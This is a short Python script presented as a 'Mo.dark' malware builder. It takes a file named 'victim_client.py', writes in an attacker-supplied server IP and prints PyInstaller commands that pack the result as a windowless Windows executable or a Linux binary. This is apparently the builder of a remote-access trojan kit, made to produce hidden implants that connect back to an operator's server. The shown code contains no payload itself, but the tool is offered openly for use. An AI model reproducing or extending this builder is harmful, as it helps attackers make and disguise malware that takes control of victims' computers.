# Mo.dark ready 🕷️☠️
# BUILDER - Custom Client Generator

import os
import sys

def build_client(server_ip, output_name="client"):
    
    with open("victim_client.py", "r", encoding='utf-8') as f:
        code = f.read()
        
    code = code.replace('SERVER_IP = "192.168.1.100"', f'SERVER_IP = "{server_ip}"')
    
    with open(f"{output_name}.py", "w", encoding='utf-8') as f:
        f.write(code)
        
    print(f"[+] Client created: {output_name}.py")
    print("[+] Convert to EXE (Windows):")
    print(f'    pyinstaller --onefile --noconsole {output_name}.py')
    print("[+] Convert to ELF (Linux):")
    print(f'    python -m PyInstaller --onefile {output_name}.py')
    
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python builder.py <ADMIN_IP> [output_name]")
        sys.exit(1)
        
    ip = sys.argv[1]
    name = sys.argv[2] if len(sys.argv) > 2 else "client"
    build_client(ip, name)